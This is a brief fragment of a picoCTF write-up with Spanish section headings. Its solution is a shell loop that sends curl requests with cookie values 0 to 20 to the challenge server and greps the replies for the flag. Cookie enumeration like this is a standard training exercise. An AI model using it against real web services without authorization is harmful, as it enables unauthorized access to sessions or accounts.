...
## Solución
hani06@DESKTOP-4NE4RTQ:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep "I love\|picoCTF"
...
^Z
[1]+  Stopped                 for i in {0..20};
do
    curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i";
done | grep "I love\|picoCTF"
## Notas
